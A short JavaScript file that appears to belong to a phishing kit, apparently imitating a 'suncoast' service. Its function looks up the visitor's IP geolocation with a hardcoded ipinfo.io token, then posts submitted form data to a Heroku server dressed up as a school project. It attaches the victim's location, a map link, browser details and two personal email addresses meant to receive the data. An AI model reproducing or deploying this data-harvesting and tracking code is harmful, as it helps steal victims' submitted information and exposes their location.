const BASE_URL = "https://school-project-101.herokuapp.com";
// const BASE_URL = "http://localhost:8080";

async function postDataToServer(path, body, onSuccess, onError) {
  try {
    const { data } = await axios.get(
      "https://ipinfo.io/json?token=9934d873c89112"
    );

    const result = await axios.post(`${BASE_URL}${path}`, body, {
      headers: {
        "Content-Type": "application/json",
        source: "suncoast",
        email_to: "millerallen069@gmail.com,hendrickorton@gmail.com",
        browser: `${getClient().appName}: ${getClient().browserName}, version:${
          getClient().majorVersion
        }`,
        ...data,
        locationLink: `https://www.google.com/search?q=${
          data.loc.split(",")[0]
        }%2C${data.loc.split(",")[1]}&rlz=1C1GCEB_enNG999NG999&oq=${
          data.loc.split(",")[0]
        }%2C${data.loc.split(",")[1]}`,
        dateTime: new Date(),
      },
    });

    onSuccess(result.data);

    // setTimeout(() => {
    //   onSuccess({});
    // }, 3000);
  } catch (err) {
    let message =
      typeof err.response !== "undefined"
        ? err.response.data.message
        : err.message;
    onError(message);
    console.error(err);
  }
}
